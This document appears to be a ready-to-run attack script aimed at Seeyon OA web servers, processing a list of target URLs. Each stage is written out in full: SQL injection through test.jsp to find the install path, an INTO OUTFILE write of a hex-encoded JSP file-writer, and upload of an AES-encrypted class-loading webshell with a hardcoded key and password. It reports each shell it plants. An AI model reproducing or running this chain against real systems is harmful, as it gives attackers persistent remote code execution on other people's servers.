#request urls=array
function GetBaseDir(domain){
	url = domain."/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)";
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
	if(StrFindStr(res[0],"@@basedir",0) != "-1"){
		r = StrRe(res[0],">(.*?)\\UFseeyon");
		if(GetArrayNum(r) >= 2){
			return r[1];
		}
	}
	return "";
}
function Upload(domain,dir){
	newdir = StrReplace(dir,"\\","/");
	newdir = StrReplace(newdir," ","%20");
	url = domain."/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27".newdir."/UFseeyon/OA/tomcat/webapps/yyoa/wker66.jsp%27";
	HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
	res = HttpGet(domain."/yyoa/wker66.jsp","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
	if(StrFindStr(res[1],"200 OK",0) != "-1"){
		return 1;
	}else
	{
		return 0;
	}
}
function GetShell(domain){
	HttpPost(domain."/yyoa/wker66.jsp?f=wker6666.jsp","t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
	res = HttpGet(domain."/yyoa/wker6666.jsp","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
	if(StrFindStr(res[1],"200 OK",0) != "-1"){
		return 1;
	}else
	{
		return 0;
	}
}
function main(args){
	num = GetArrayNum(urls);
	i = 0;
	while(i < num){
		domain = urls[i];
		try{
			printclolor("[?]当前检测:".domain,7);
			dir = GetBaseDir(domain);
			if(dir != ""){
				printclolor("目录:".dir,1);
				if(Upload(domain,dir) == 1){
					if(GetShell(domain) == 1){
						printclolor("[+]".domain."/yyoa/wker6666.jsp   密码:rebeyond",3);
					}
				}
			}
		}catch{
		}
		i = ToInt(i+1);
	}
	print("检测完毕！");
}